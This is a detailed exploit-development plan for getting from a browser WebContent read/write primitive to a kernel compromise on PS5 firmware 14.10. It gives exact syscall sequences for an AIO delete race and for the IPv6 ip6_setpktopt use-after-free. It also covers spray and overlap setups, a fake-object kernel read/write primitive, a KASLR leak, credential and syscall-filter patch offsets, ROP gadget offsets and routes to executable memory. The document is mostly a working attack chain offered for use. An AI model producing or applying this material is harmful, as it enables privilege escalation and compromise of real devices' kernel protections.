# From WebContent arb R/W to PS5 14.10 kernel compromise

**Kernel-escalation path, candidate ranking, exact syscall sequences, and the ROP-to-kernel plan**
**Date:** 2026-10-26
**Scope:** PS5 firmware 14.10, browser-only entry, post-Canvas arbitrary read/write in WebContent
(`TypedArray m_vector` overwrite), `libSceNKWebKit` module base, heap pointers in `0x10_xxxxxxxx`,
`BigUint64Array`, `thr_create(430)`.

**Evidence base**

- This repo: `refs/ipso_exploit.js` (PS5 3.xx/4.xx IPv6 WebKit-ROP kernel exploit),
  `refs/relapse_exploit.js` (13.60 AIO kernel exploit), `offsets/13.60.js` (kernel struct map),
  `docs/`, `DEEPSEEK_HANDOFF.md`.
- `.tmp/sdk` = `ps5-payload-sdk` v0.45, commit `a7685ce` "Add kernel offsets for 14.00/14.10".
- External 14.10 research: live probes (Lua-loader process) with measured syscall behavior,
  AIO range evidence, IPv6 probes, W^X/mprotect sweeps, threading evidence.
- Public: FreeBSD-SA-20:20.ipv6, FreeBSD-SA-19:02.fd, theflow0's CVE-2020-7457 exploit,
  `Cryptogenic/PS5-IPV6-Kernel-Exploit`.

Confidence tags: **[CONFIRMED]** measured on a 14.10 console; **[LIKELY]** multiple independent
indicators; **[UNKNOWN]** needs a probe; **[DEAD]** evidence says do not implement.

---

## 0. Executive answer

**The candidate list has at most one live kernel bug per kernel identity, and the identity is
currently contradictory.** Your brief says "FreeBSD 14.1"; the live 14.10 probes in this workspace
report `FreeBSD r230171` (11.0-CURRENT, 2012) with 16 KB pages. That single fact changes the ranking:

| World | Live candidates | Fastest real path |
|---|---|---|
| **A. r230171 / FreeBSD-11 fork** (workspace evidence) | IPv6 CVE-2020-7457, aio_multi_delete | **IPv6 first** (complete public WebKit-ROP port; 1–3 weeks; ~80% on PS5 3.xx) |
| **B. FreeBSD 14.1** (your stated constraint) | aio_multi_delete only (per your intel) | **aio_multi_delete** (3–6 weeks of original work; IPv6/5596 are upstream-fixed) |

**Do not port either one until two one-hour gates pass.** The gates are in §2 and §6:

1. **Kernel identity gate** — call `__xuname(256, buf)` (syscall 165), read `release`/`version`.
   If it says 14.1, the IPv6 candidate is a trap: FreeBSD fixed CVE-2020-7457 in 11.4/12.0 in
   2020 (SA-20:20). If it says `11.0-RELEASE ... r230171`, the 2012 fork likely predates the fix
   and IPv6 becomes the fastest path.
2. **IPv6 option-25 gate** — run one `setsockopt(fd, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, cmsg,
   0x18)` with a **valid** `IPV6_TCLASS` cmsg. The previous 14.10 probes used `IPV6_PKTINFO(46)`
   for the race and an invalid zeroed buffer for option 25; neither tests the vulnerable path.

**The biggest missing piece is not the UAF. It is a kernel base leak and an executable-page path.**

- The IPv6 exploit contains a self-contained KASLR leak (kqueue data pointer → `.data` base).
- The AIO exploit does not: Relapse's AF_ROUTE KASLR leak is sanitized on 14.10 (53b: zero
  pointer-shaped qwords in the RTM_GET reply). Budget a new leak as a first-class work item.
- `jitshm_create/alias` (533/534), the clean "mmap RWX equivalent" used by the PS5 3.xx exploit,
  returned `-1` in the 14.10 game-process probe (251a). Verify from WebContent; if blocked, the
  only remaining route is patching `vm_map_entry->protection` via kernel R/W (SDK v0.45's
  `kernel_mprotect`), and if the hypervisor enforces W^X on the PTE, **native code execution is
  not available and the endgame is pure ROP + kernel data patches**.

**Recommended order of work**

1. Kernel identity gate (30 min).
2. IPv6 option-25 gate (30 min) and one overlap attempt (1 h). If option 25 works and the kernel
   is the 11 fork, commit to IPv6.
3. If the kernel is 14.1, or option 25 is refused even with a valid cmsg, commit to
   `aio_multi_delete`; adapt the Relapse AIO infrastructure and build a new KASLR leak.
4. Only after kernel R/W: ucred/`p_dynlib`/`vm_map_entry` patches, then the exec-page decision.

---

## 1. Premise conflict: which kernel is actually running?

This is the most important section. Firmware **14.10 and FreeBSD 14.1 are different version
numbers**; do not assume the firmware number identifies the kernel base. The workspace contains
evidence for both claims, and they cannot both be right:

| Evidence | Says | Source |
|---|---|---|
| `FreeBSD r230171 (Sep 28 2026), 16KB pages` | 11.0-CURRENT fork, 2012 base, Sony build 2026 | external research; `docs/KERNEL_AUDIT.md` |
| 16 KB pages | Sony customization; FreeBSD 14.1 defaults to 4 KB | external 14.10 live probes |
| SDK v0.45 14.10 offsets: `p_ucred=0x40`, `p_fd=0x48`, `p_pid=0xBC`, `p_vmspace=0x200`, `text→data=0xCE0000` | The 14.10 `struct proc`/`ucred` layout is the same family as 13.60 | `.tmp/sdk/crt/kernel.c` |
| `.tmp/fbsd141/`, `.tmp/kernel/` (FreeBSD 14.x `vm_map.c`, `ip6_output.c`) | Someone is analyzing 14.1 source for 14.10 | workspace |
| This brief | "FreeBSD 14.1 kernel" | user |

**What each world implies**

| Candidate | On r230171 (11.0 fork) | On FreeBSD 14.1 |
|---|---|---|
| CVE-2020-7457 IPv6 | [LIKELY] vulnerable: 2012 code predates SA-20:20 (2020) | [DEAD] fixed in 12.0/11.4; 14.1 contains the `INP_WLOCK` and `M_NOWAIT` fix |
| CVE-2019-5596 SCM_RIGHTS | [DEAD] bug introduced in 11.2-STABLE after r338618 (2018); r230171 predates it | [DEAD] fixed 2019-02-05 |
| aio_multi_delete | [LIKELY] Sony AIO code is independent of upstream; 662–670 are live on 14.10 | [LIKELY] same; AIO family is Sony-specific |
| CVE-2024-43102 umtx SHM | [DEAD] SHM does not exist in 11.0 | [DEAD/UNKNOWN] `shm_open2` is nosys, `UMTX_OP_SHM` unexercised |
| CVE-2026-49418 msync | [DEAD] path unreachable | [DEAD] `MS_INVALIDATE` returns `EINVAL` on every 14.10 mapping |

**The gate (30 minutes).** From WebContent, after you have a syscall primitive:

```c
char buf[0x500];                       // 5 * 256
long rv = syscall(165, 256, buf);      // __xuname; 164 is the FreeBSD4 ABI, 165 is __xuname
// release = buf + 0x200, version = buf + 0x300, machine = buf + 0x400
```

If 165 is filtered, use `sysctl` (202) with MIB `[1,1]` (`kern.osreldate`), `[1,2]`
(`kern.osrelease`), `[1,3]` (`kern.version`). `kern.osreldate` is numeric: `1100500` = 11.0,
`1401000` = 14.1. A string that contains both "11.0" and "r230171" is the 11 fork; a string that
contains "14.1-RELEASE" is the 14.1 world. Do not trust `uname -r` alone if Sony keeps a
compatibility string; `kern.osreldate` and the presence of the `ip6_pcbopts` lock are decisive.

**If the console is 14.1:** stop reading the IPv6 port section as a plan; treat it as a
"what would have to be true" appendix. The rest of the document still applies to AIO.

---

## 2. Candidate deep dives

### 2.1 aio_multi_delete race UAF (your candidate #1)

**Status.** [LIKELY] live on 14.10; [LIKELY] patched in 14.20 with a generation check (your
intel). The public family is Lapse/PSFree (≤10.01) and Relapse (`aio_multi_wait`, ≤13.60).
The 14.10 AIO family is **reachable**: 662/663/664/666/669/670 are real handlers; 661
(`aio_submit`) and 668 (`aio_create`) are `nosys` stubs that raise SIGSYS; 96a drove a
one-byte read through 669→664→662 and the loader survived.

**The AIO ABI on 14.10 (measured; use these numbers, not FreeBSD's 465-range aio)**

| # | Name | Contract |
|---|---|---|
| 661 | `aio_submit` | **nosys**; SIGSYS; do not call |
| 662 | `aio_multi_delete` | `(u32 *ids, int count, u32 *results)`; count 1..128 |
| 663 | `aio_multi_wait` | `(u32 *ids, int count, u32 *states, u32 mode, void *timeout)` |
| 664 | `aio_multi_poll` | `(u32 *ids, int count, u32 *states, u32 mode)` |
| 665 | `aio_get_data` | real; kills on zero args; not needed |
| 666 | `aio_multi_cancel` | `(u32 *ids, int count, u32 *results)` |
| 668 | `aio_create` | **nosys** |
| 669 | `aio_submit_cmd` | `(u32 cmd, void *reqs, u32 count, u32 class, u32 *ids)` |
| 670 | `aio_init` | `(void *config, u32 version, void *unused, u32 zero)`; zeros accepted |

`aio_submit_cmd` descriptor stride is **0x28**:
`+0x00` offset (signed), `+0x08` byte count, `+0x10` data pointer, `+0x18` result pointer,
`+0x20` fd, `+0x24` padding. `cmd` is 1=read, 2=write; `count` 1..128; `class` 1..3.
`669` returns 0 even when it refuses; the per-request result word is the truth
(`0x80020003` unknown id, `0x80020005` queue full, `0x8002000E` EFAULT, `0x80020010` busy).

**What the 13.60 handler decode says about the race.** `aio_multi_delete` does, per id:
low16 handle lookup through `0x399ee0` with process+0xc48 context and tag `0x160`; high16 slot
bounds check; `0x399e20` accepts a held reference; state+8 must be 3 or 4; completion flag+0xc
and waiter/link pointer+0x50 are checked while synchronizing on request+0x20; then the object is
**reacquired** through `0x39a2a0` and the per-slot entries are removed and freed. The initial
validation and the deletion reacquisition are the two ends of the race window. If the racing
thread frees the request and `aio_submit_cmd` reallocates the same slot with a new request between
those ends, the delete frees the new object's sub-objects.

The 14.10 id has a **3-bit generation** in bits 13–15 (352o: `0x2205, 0x4205, …, 0xE205, 0x0205`;
8 values then wrap), and the kernel rejects a bumped generation at lookup (352p). That is *not*
the 14.20 fix. The 14.20 fix is presumably a generation/reference re-check at the **delete-time
reacquisition**; 14.10 is the window where the reacquisition trusts the earlier lookup.

**Exact syscall sequence**

```c
// one-time per process
aio_init(NULL, 0, NULL, 0);                      // 670 -> 0

// create one completed request
struct aio_req r = { .off=0, .len=16, .data=buf, .result=&res, .fd=sockfd };
u32 id = 0;
aio_submit_cmd(1 /*read*/, &r, 1, 1, &id);       // 669 -> 0, id = 0x4205
u32 state = 0;
while (state != 3) aio_multi_poll(&id, 1, &state, 0);  // 664
// now the request is completed and deletable

// race A: delete vs wait/cancel + re-submit
// thread 1: aio_multi_delete(&id, 1, &result);           // 662
// thread 2: aio_multi_wait(&id, 1, &state, 0, &tv);      // 663 (frees the completed node)
//           or aio_multi_cancel(&id, 1, &result);        // 666
// thread 3: aio_submit_cmd(...) spray to reclaim the slot // 669
```

Use a **batch delete of 128 ids** with the target id first and 127 valid duplicates/controls after
it. The loop spends time per id; the racer gets a wider window. Pin the delete and wait threads to
the same CPU (`cpuset_setaffinity`, 488) and raise priority (`rtprio_thread`, 466) if the syscalls
are allowed; otherwise use many iterations. The 3.xx IPv6 exploit uses the same pinning trick
(`refs/ipso_exploit.js` stage 1).

**Can you probe `aio_*` without crashing?**

Yes, with a bounded lifecycle probe. The dangerous call is 661 (`aio_submit`), which is a
`nosys` stub that raises SIGSYS; 668 is the same. Everything in 662–670 is a real handler and
returns `-1`/status on bad input rather than killing, as long as you pass **bounded user
pointers**. Probe order, one step per page load:

1. `sigaction(SIGSYS=12, SIG_IGN, 0)` (syscall 416) so a stray `nosys` returns `-1`.
2. `aio_init(NULL,0,NULL,0)` (670). Expect `0` on a fresh process; `-1` means already initialized.
3. Create a `socketpair(AF_UNIX, SOCK_STREAM)` (135); one end is the AIO fd.
4. Submit **one** read with a 16-byte buffer and `count=1,class=1` (669). Expect `0` and an id.
5. Poll 664 in a bounded loop (≤200 ms). Expect state `3` (completed) or `0x10003` on re-poll.
6. Delete 662 with count 1. Expect `0`; result `0`.
7. Duplicate-delete `[id,id]` in one batch. Expect first `0`, second `0x80020003` (96a measured
   this; it is ordinary sequential removal, not a double free).
8. Poll the deleted id. Expect `0x80020003`.
9. Only then run the 3-thread race, with a canary `getpid` before/after and a crash counter.

If any step kills the tab, that is data: the handler is hostile for that shape. Do **not** repeat
the same input hoping for a different result; change one field (count, id order, state) per run.

**Exploitation outline (original work)**

1. Win the race so a freed `aiocb`/sub-object is reallocated by an object you control.
2. Turn the UAF into a kernel read/write. The Relapse code uses the AIO request/wait group as the
   corruption target and then pivots to a pipe; the exact reclaim depends on the 14.10 AIO
   allocator (requestSize 0x28, waiterSize 0x38, slotStride 0x30, entryType 0x160 on 13.60 —
   re-derive for 14.10).
3. Get a kernel base leak. **This is the hard part.** Relapse's AF_ROUTE leak is dead on 14.10.
   Options: a kernel pointer in the corrupted AIO object; a kqueue/pipe object allocated into the
   freed slot; or a separate 14.10 leak (see §4).
4. Walk `allproc` (14.10: `data_base + 0x28D9EA0`), find your pid (`proc+0xBC`), patch `ucred`
   (`uid 0x04`, `ruid 0x08`, `svuid 0x0C`, `ngroups 0x10`, `rgid 0x14`, `svgid 0x18`,
   `sceAuthId 0x58`, `sceCaps 0x60/0x68`, `sceAttrs 0x80`) and the `p_dynlib` filter
   (13.60 offsets: `p_dynlib 0x3E8`, `syscallStart 0xF0`, `syscallEnd 0xF8`,
   `restrictFlags 0x118`, `libkernelRef 0x18`).
5. Exec page: `jitshm_create`/`alias` or `vm_map_entry` patch (see §5).

**Time / reliability / crash risk.** 3–6 weeks with the Relapse code as the base; reliability
unknown until the race is measured; crash risk **high** (a failed AIO race corrupts the shared
queue and can panic). The AIO queue is per-process; a panic reboots the console.

---

### 2.2 CVE-2020-7457 — IPv6 `ip6_setpktopt` race (your candidate #2)

**Status.** [CONFIRMED] public, complete exploit: theflow0's C exploit (Metasploit
`freebsd/local/ip6_setpktopt_uaf_priv_esc`), tested on FreeBSD 9.0–9.3 and 12.0/12.1, plus a
**WebKit-ROP port for PS5 3.00–4.51** (`Cryptogenic/PS5-IPV6-Kernel-Exploit`, ~80% reliability,
arbitrary read + semi-arbitrary write, root, debug menu). [UNKNOWN] on 14.10: the bug was fixed
upstream in 2020 (SA-20:20), and the 14.10 probes have **not** tested the vulnerable option
correctly.

**The bug.** `setsockopt(IPPROTO_IPV6, IPV6_2292PKTOPTIONS)` (option **25**, not 46) calls
`ip6_pcbopts(&in6p->in6p_outputopts, m, so, sopt)` without holding `INP_WLOCK` in the pre-fix
code. Two threads race allocate/replace and free on the same socket; the result is a UAF on
`struct ip6_pktopts` (size **0xD0**, 0x100 malloc bucket). The master socket and one spray socket
end up pointing at the same `ip6_pktopts`. The fix wraps `ip6_pcbopts` in `INP_WLOCK/INP_WUNLOCK`
and changes the allocation to `M_NOWAIT`.

**Do we have `setsockopt` for `IPV6_PKTINFO`?** Yes. 91a measured `PKTINFO(46)=0`,
`TCLASS(61)=0`, `RTHDR(51)=0`, `V6ONLY(27)=0`; 143p measured 2292PKTINFO(19), 2292HOPLIMIT(20),
2292RTHDR(24) as working. **But option 46 is the R/W primitive, not the race.** The race is
option 25. 396a called option 25 with an all-zero 64-byte buffer and got `-1`; that buffer is not
a valid cmsg chain (`cmsg_len=0`, `level=0`, `type=0`). That is a malformed test, not evidence of
absence.

**Exact race setup** (from `refs/ipso_exploit.js` stage 1 and the C exploit)

```
master = socket(AF_INET6=28, SOCK_DGRAM=2, IPPROTO_UDP=17)
spray[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP)   // 0x190 = 400 sockets in the 3.xx port

cmsg (0x18 bytes, CMSG_SPACE(4)):
  +0x00 cmsg_len   = 0x14          // CMSG_LEN(4)
  +0x04 cmsg_level = 41            // IPPROTO_IPV6
  +0x08 cmsg_type  = 61            // IPV6_TCLASS
  +0x10 data       = 0

thread A (use):  loop setsockopt(master, 41, 25, cmsg, 0x18)
thread B (free): loop setsockopt(master, 41, 25, NULL, 0)
main:            loop {
                    setsockopt(master, 41, 61, &tag, 4)          // tag the master pktopts
                    for each spray: setsockopt(spray[i], 41, 61, &tag, 4)
                    getsockopt(master, 41, 61, &val, &len)
                    if (val == tag) -> overlap; else free spray pktopts and retry
                 }
```

Pinning: `cpuset_setaffinity(level=3, which=1, id=-1, setsize=0x10, mask)` (488) and
`rtprio_thread(1, 0, {prio=0x100})` (466) widen the window; the 3.xx code uses them. If the
WebContent filter blocks them, use more iterations and both threads on the same core by
construction.

**Overlap detection.** Set `IPV6_TCLASS` on master to `0x13370000|idx`; `getsockopt` each spray
socket for TCLASS. A spray socket returning the master tag shares the `ip6_pktopts`.

**Fake the pktopts.** Free master's pktopts (`setsockopt(master,25,NULL,0)`), then spray
`IPV6_RTHDR` (51) with a 0x100-byte routing-header buffer:

```
buf[0x10] = pktinfo_ptr        // struct ip6_pktopts.ip6po_pktinfo
buf[0xC0] = tag | i            // ip6po_tclass
setsockopt(spray[i], 41, 51, buf, rthdr_len)
```

`getsockopt(master, 41, 61)` returns the tag; its low 16 bits index the overlap socket. Now the
master's `ip6_pktopts` is the fake object you control.

**The R/W primitive.** `struct ip6_pktopts` layout (confirmed by compiling the layout probe):
`ip6po_pktinfo` at **+0x10**, `ip6po_rhinfo.ip6po_rhi_rthdr` at **+0x70**, `ip6po_tclass` at
**+0xC0**, size 0xD0. `struct in6_pktinfo` is 0x14 bytes: 16-byte address, `ipi6_ifindex` at
**+0x10**.

- `setsockopt(master, 41, 46 /*IPV6_PKTINFO*/, &buf, 0x14)` with `buf[0..7] = addr` rewrites the
  shared `ip6po_pktinfo` pointer to `addr`.
- `getsockopt(victim, 41, 46, out, &len)` copies **20 bytes from `addr`**.
- `setsockopt(victim, 41, 46, in, 0x14)` copies **20 bytes to `addr`**, with `bytes 0x10..0x13`
  constrained to 0 or a valid interface index. This is the "semi-arbitrary" write; the C exploit
  sets them to 0 and the 3.xx port uses it for credentials.

**KASLR.** The 3.xx port leaks a `struct kqueue *` from the 0x120 slab, sprays kqueues into the
0x100 slab, then scans the kqueue's `.data` for a pointer whose low 16 bits equal a build constant
(`KQUEUE_LOW_WORD`: 0x8AD3 on 4.03, 0x88F7 on 4.50, 0x8AB5 on 4.51). It subtracts
`KQUEUE_BASE_SLIDE` (0x318000) and page-aligns to get the **kernel `.data` base**. For 14.10 you
need a new `LOW_WORD`/`SLIDE` (from a kernel dump or a known kqueue pointer), or the alternative
`knote->kn_fop->f_detach` text pointer with the 14.10 `f_detach` offset. The SDK v0.45 14.10
offsets then give `allproc`, `rootvnode`, `security_flags`, etc. relative to the data base.

**Port plan (if the bug is live).** The race, the pktopts offsets, and the R/W primitive are
structurally unchanged from 3.xx. What must be re-derived for 14.10:

1. `libkernel` syscall-wrapper offsets (the 3.xx map in `refs/ipso_exploit.js` is 4.03/4.50/4.51).
   Use `getpid+0xa` as a generic `syscall; ret` and the WebKit gadget map instead (see §5).
2. The `libSceNKWebKit` gadget map (`wk_gadgetmap` in `offsets/13.60.js` is a template; the 14.10
   build needs its own `pop rdi/rsi/rdx/rcx/rax/rsp` and `mov [rdi],rsi` addresses).
3. The kqueue `.data` low-word/slide, or another KASLR leak.
4. The 14.10 `p_dynlib` filter offsets (13.60: 0xF0/0xF8/0x118/0x18; SDK `dynlib_obj_t` is the
   starting layout).
5. The exec-page path: jitshm 533/534 if allowed; else `vm_map_entry` patch.

**Time / reliability / crash risk.** 1–3 weeks if the bug is live and the gadget map exists;
70–85% reliability based on the 3.xx port; crash risk **medium** (race can panic; a kernel panic
reboots the console). If the bug is patched, 0 weeks — do the option-25 gate first.

---

### 2.3 CVE-2019-5596 — SCM_RIGHTS `f_count` overflow (your candidate #3)

**Status: [DEAD] on both likely baselines.**

FreeBSD-SA-19:02.fd: the bug is in FreeBSD 12.0's truncation handling of SCM_RIGHTS; the code
closes descriptors referenced by a discarded control message but fails to drop a reference. The
advisory's "Affects" line is **FreeBSD 12.0** and the fix landed 2019-02-05 (stable/12 r343785,
releng/12.0 r343790, stable/11 r343786). The CVE record narrows it further: **11.2-STABLE after
r338618 and before r343786, 12.0-STABLE before r343781, 12.0-RELEASE before p3**.

- On r230171 (2012): the vulnerable truncation code (r338618, 2018) **does not exist**. Dead.
- On 14.1: fixed five years earlier. Dead.

**Is SCM_RIGHTS sendmsg available in WebContent?** Yes, the mechanism is available: 526a confirmed
`sendmsg`/`recvmsg` with SCM_RIGHTS delivers working fds across `SOCK_STREAM`/`DGRAM`/`SEQPACKET`
socketpairs, and `socketpair(135)` is allowed. But availability of the transport does not create
the bug.

**Is ~2 minutes with 8 threads practical?** Even if the bug were live, that estimate is optimistic
for a browser: 2^32 reference increments with ~253 fds per message is ~17M messages; the WebContent
fd limit, the socket send buffer, and the receiver's truncation path throttle it far below the
"C loop" rate. The 2-minute figure comes from a native process with a tuned `sendmsg` loop. In a
browser session it is minutes-to-tens-of-minutes, with a high chance of the tab being killed by
the watchdog first. **Do not implement.**

---

### 2.4 CVE-2024-43102 — umtx SHM (your candidate #4)

**Status: [DEAD/UNREACHABLE].**

- On the 11.0 fork: `_umtx_op` SHM (op 25) and `shm_open2`/largepage objects do not exist.
  2024-43102 is a FreeBSD 14.0+ feature.
- On 14.1: the code exists upstream, but the PS5 exposes `shm_open(482)` only; `shm_open2(571)` is
  `nosys` (external probes 391a-391d), and `UMTX_OP_SHM(25)` was never exercised on 454. The 14.10
  `shm_open` path works for POSIX shm, not the largepage/SHM object the CVE needs.
- The external research dead-ends list already includes 2024-43102.

The CVSS 10.0 is irrelevant if the object cannot be created. **Do not implement.**

---

### 2.5 CVE-2026-49418 — msync device-pager UAF (your candidate #5)

**Status: [DEAD] via the public interface on 14.10.**

The advisory (FreeBSD-SA-26:37.vm) needs three steps in order: map an unmanaged device object
(`OBJT_DEVICE`), call `msync(MS_INVALIDATE)` over part of it, then fault the pages again. On 14.10,
`msync(65)` with `MS_INVALIDATE` returns `EINVAL` on **every** mapping type tested: anonymous,
GPU-shaped, `/dev/dmem0` `MAP_SHARED`, `/dev/gc` `MAP_SHARED`, vnode-backed `eboot.bin`, and
`/savedata0` files. `MS_ASYNC` and `MS_SYNC` return 0 on the same mappings; the unused bit 8 is
ignored. The refusal happens before the page list is touched (455a–455d). The public claim that
this CVE yields kernel R/W on a PS5 is not supported by the measurements.

The only way to revisit is a different msync entry that bypasses the flag check; none is known.
**Do not implement.** You will already have code execution before this becomes relevant, which is
the definition of the wrong order.

---

## 3. Ranking

### 3.1 Scores

Scale: time 1 = days, 5 = months; reliability 1 = coin flip, 5 = deterministic; crash risk
1 = safe, 5 = panic-prone. "Pieces" = how much of the chain already exists in this workspace.

| Candidate | Live? | Time | Reliability | Crash risk | Pieces | Kernel leak | Exec page | Verdict |
|---|---|---|---|---|---|---|---|---|
| **IPv6 CVE-2020-7457** | conditional (11 fork only) | 2 | 4 | 3 | **5** (full WebKit-ROP port) | **built-in** | jitshm on 3.xx; 14.10 status unknown | **GO if gate passes** |
| **aio_multi_delete** | [LIKELY] yes | 4 | 3 | 4 | 3 (Relapse AIO infra) | **missing** (AF_ROUTE dead) | same wall | **GO if IPv6 dead** |
| CVE-2019-5596 | no | — | — | — | 1 | — | — | **NO-GO** |
| CVE-2024-43102 | no | — | — | — | 1 | — | — | **NO-GO** |
| CVE-2026-49418 | no | — | — | — | 1 | — | — | **NO-GO** |

### 3.2 Rank under Scenario A (r230171 / 11.0 fork)

1. **IPv6 CVE-2020-7457** — fastest and most complete. Port `refs/ipso_exploit.js`; the bug is
   likely unpatched; the KASLR leak is built in; the 3.xx port is 80% reliable.
2. **aio_multi_delete** — fallback. The AIO family is reachable, but the delete race is original
   research and the KASLR leak is missing. Use Relapse's submit/poll/wait, `ucred`, `p_dynlib`,
   and pipe code as the base.
3. **CVE-2019-5596** — dead (predates r338618).
4. **CVE-2024-43102** — dead (no SHM).
5. **msync** — dead (`MS_INVALIDATE` EINVAL).

### 3.3 Rank under Scenario B (FreeBSD 14.1)

1. **aio_multi_delete** — the only candidate on your list that is not upstream-patched. It is
   "fastest" by elimination: 3–6 weeks, high crash risk, and the KASLR leak is the critical path.
2. **IPv6** — dead: SA-20:20 is in 11.4/12.0 and 14.1 contains the `INP_WLOCK`/`M_NOWAIT` fix.
   If you have a 14.10 kernel binary that lacks the lock, override this; otherwise do not port.
3. **CVE-2019-5596** — dead.
4. **CVE-2024-43102** — dead (SHM stubbed).
5. **msync** — dead.

---

## 4. Answers to the six questions

### Q1. Which kernel candidate is fastest to implement?

**If the kernel is 14.1: `aio_multi_delete`.** It is the only live candidate; the IPv6 and
SCM_RIGHTS bugs are upstream-fixed, and the umtx/msync paths are unreachable. "Fastest" means
3–6 weeks of original work, not a port.

**If the kernel is the r230171 11.0 fork: IPv6 CVE-2020-7457.** A complete WebKit-ROP
implementation exists for PS5 3.00–4.51; the work is offsets, gadgets, and the 14.10 kqueue
constants, not exploit design. 1–3 weeks, ~80% reliability.

The answer is conditional because the kernel identity is conditional. The `__xuname` gate is the
cheapest way to collapse it.

### Q2. For `aio_multi_delete`, what is the exact syscall sequence? Can we probe availability without crashing?

Sequence: `670 init` → `669 submit(read, req, 1, 1, &id)` → `664 poll` until state 3 →
`662 delete(&id,1,&res)`; the race adds `663 wait` or `666 cancel` and a `669` spray, with a
128-id batch. The exact contracts are in §2.1.

Probing is safe if you respect three rules: ignore SIGSYS first (416), never call 661/668, and
pass only bounded user pointers. The 9-step probe in §2.1 establishes availability, a completed
request, and duplicate-delete behavior without any hostile address. The 96a result (first delete 0,
second `0x80020003`) is the expected clean baseline; it is **not** evidence of a UAF.

### Q3. For IPv6: do we have `setsockopt` for `IPV6_PKTINFO`? What is the exact race setup?

Yes: `IPV6_PKTINFO` is option **46**, and 91a measured `setsockopt(master, 41, 46, ...) = 0`;
`IPV6_TCLASS` 61 and `IPV6_RTHDR` 51 also work. But the **race is on `IPV6_2292PKTOPTIONS`,
option 25**, not 46. The exact setup is in §2.2: a valid `IPV6_TCLASS` cmsg (0x18 bytes), two
threads (`setsockopt(25,cmsg,0x18)` vs `setsockopt(25,NULL,0)`), a TCLASS tag to detect the
overlap, then `IPV6_RTHDR` spray to fake the `ip6_pktopts` at `+0x10/+0x70/+0xC0`, then
`IPV6_PKTINFO` 46 on master/victim for read/write. `ip6po_pktinfo` is at `+0x10`; `struct
in6_pktinfo` is 0x14 with the ifindex at `+0x10`.

### Q4. For the fd refcount: is SCM_RIGHTS sendmsg available in WebContent? Is ~2 min with 8 threads practical?

Available: 526a confirmed SCM_RIGHTS fd passing across all socketpair types. Practical: no.
The bug is dead on both baselines (SA-19:02 affects 12.0 and 11.2-STABLE after r338618; r230171
predates it, 14.1 is fixed). Even if it were live, the 2-minute number is a native-process
measurement; WebContent's fd limit, send buffer, and watchdog make it minutes-to-tens-of-minutes.
Do not implement.

### Q5. Can we use flatz SDK v0.45's `syscall+0xa` gadget directly, or do we need our own ROP gadgets in libSceNKWebKit?

The `syscall+0xa` is directly usable and is the right primitive. In `ps5-payload-sdk` v0.45,
`crt/syscall.c:56` resolves `getpid` and adds `0xa` to land on the `syscall` instruction of the
libkernel wrapper; the wrapper is `mov r10, rcx; mov rax, imm; syscall; ret`, so a ROP chain with
`RAX = syscall number`, `RDI/RSI/RDX/R10/R8/R9 = args` can invoke any syscall. You can resolve
`getpid` via `sceKernelDlsym(1,"getpid")` (591) or read the `getpid` GOT entry from
`libSceNKWebKit`'s data (readable) and add `0xa`; verify the `0f 05` byte before trusting it.

You still need **pop/stack-pivot gadgets**; the SDK does not provide those. The 13.60
`wk_gadgetmap` (`offsets/13.60.js`: `pop rdi 0x288B2`, `pop rsi 0x14EAD`, `pop rdx 0xFA7A2`,
`pop rcx 0x80597`, `pop rax 0x3C98E`, `pop rsp 0xA1138`, `mov [rdi],rsi 0xC05B6`) is a template,
not a 14.10 map. You need the 14.10 `libSceNKWebKit` image to re-derive those offsets. The APNG
overread gives the base, not the bytes; without a 14.10 module image, the gadget map is the
second missing piece after the kernel base leak.

### Q6. What is the minimum ROP chain to (a) disable the syscall filter, (b) mmap RWX or equivalent, (c) run arbitrary native code?

**First, correct the model:** 14.10 `mprotect` is not blocked at the syscall gate in the
game-process measurement; it accepts 32768 protection values, exactly those with bit `0x4`
(execute) clear, and refuses only execute (423a). Disabling the syscall filter therefore does not
make `mprotect(EXEC)` succeed. The block is in the VM protection path (and possibly the
hypervisor). **In WebContent the syscall may additionally be filtered at the sandbox layer; verify
that before relying on the game-process result.** The direct route is to patch the `vm_map_entry`
protection, not to fight the filter.

**Minimum viable chain, three milestones:**

| Milestone | Chain | Syscalls | Data patches |
|---|---|---|---|
| **Kernel R/W** | IPv6 race → fake pktopts → `IPV6_PKTINFO` 46 read/write | 97 socket, 105 setsockopt, 118 getsockopt, 362 kqueue, 363 kevent | none |
| **Root** | leak `.data` base; `allproc` walk; `ucred`; `p_dynlib` filter | 20 getpid, 118 getsockopt | `ucred` uid/caps/authid; `p_dynlib` syscallStart/End/restrictFlags/libkernelRef |
| **Exec** | jitshm 533/534 + mmap 477, **or** `vm_map_entry` protection + shellcode; then jump | 533/534/477, or 74 mprotect | `vm_map_entry+0x64` (protection), possibly `+0x60` (max_protection) |

**(a) Disable the syscall filter.** With kernel R/W, walk `proc->p_dynlib` (13.60 offset 0x3E8;
SDK v0.45 confirms 0x3E8 for 14.10) and write `syscallStart=0`, `syscallEnd=0xffffffff`,
`restrictFlags=0`, `libkernelRef=1` (the Relapse `escalate` sequence, `refs/relapse_exploit.js`
lines 920–923). The 13.60 `dynlib` offsets are `syscallStart 0xF0`, `syscallEnd 0xF8`,
`restrictFlags 0x118`, `libkernelRef 0x18`; verify them on 14.10 before writing. This is a kernel
**data** patch, not a text patch; it is compatible with XOM.

**(b) mmap RWX or equivalent.** Three options, in order of preference:
1. **jitshm** (533 create / 534 alias): `jitshm_create(0, size, 0x7)` → exec handle;
   `jitshm_alias(exec_handle, 0x3)` → write handle; `mmap(addr, size, 0x3, 0x11, write_handle, 0)`
   to write; `mmap(addr, size, 0x5, 0x11, exec_handle, 0)` to execute. This is exactly what the
   3.xx ELF loader does (`refs/ipso_exploit.js` lines 1765–1793). **14.10 status: 533/534 returned
   `-1` in the game process (251a); verify in WebContent.** If they work, this is the cleanest
   path and no `mprotect`/filter patch is needed.
2. **`vm_map_entry` patch** (SDK v0.45 `kernel_mprotect`): walk `proc->p_vmspace->vm_map`
   (14.10 vmspace offsets `vm_root 0x1D0`, `vm_pmap 0x2E8`), find the entry for your shellcode
   page, write `prot` at `entry+0x64` (and `max_protection` at `+0x60` if needed), then write
   shellcode into the page and jump. This bypasses the `mprotect` syscall policy. If the
   hypervisor enforces W^X at the PTE, the jump faults; that is the decisive test.
3. **Pure ROP**: if both fail, do not chase native code. Use ROP to call existing functions and
   kernel data patches to change credentials/jail; the "arbitrary native code" milestone is
   blocked by the hypervisor, not by the syscall filter.

